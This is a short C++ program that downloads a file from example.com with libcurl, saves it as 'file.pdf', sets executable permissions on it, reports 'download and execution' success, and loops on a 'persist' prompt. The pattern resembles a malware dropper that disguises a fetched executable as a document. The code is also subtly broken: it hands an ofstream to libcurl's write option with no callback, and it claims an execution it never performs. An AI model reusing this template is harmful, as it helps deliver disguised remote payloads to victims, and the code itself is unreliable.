#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <sys/stat.h>

int main(void)
{
    bool persist = true;

    do {
        CURL *curl;
        CURLcode res;
        std::ofstream outfile;

        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/path/to/file");
            outfile.open("file.pdf", std::ios::binary);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outfile);
            res = curl_easy_perform(curl);
            /* always cleanup */
            curl_easy_cleanup(curl);
            outfile.close();
        }
        else {
            std::cerr << "Curl initialization failed." << std::endl;
            return 1;
        }

        int status = chmod("file.pdf", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
        if (status != 0) {
            std::cerr << "Failed to change file permissions." << std::endl;
            return 1;
        }

        std::cout << "File download and execution successful." << std::endl;

        char response;
        std::cout << "Do you want to persist (y/n)? ";
        std::cin >> response;

        if (response != 'y') {
            persist = false;
        }
    } while (persist);

    return 0;
}
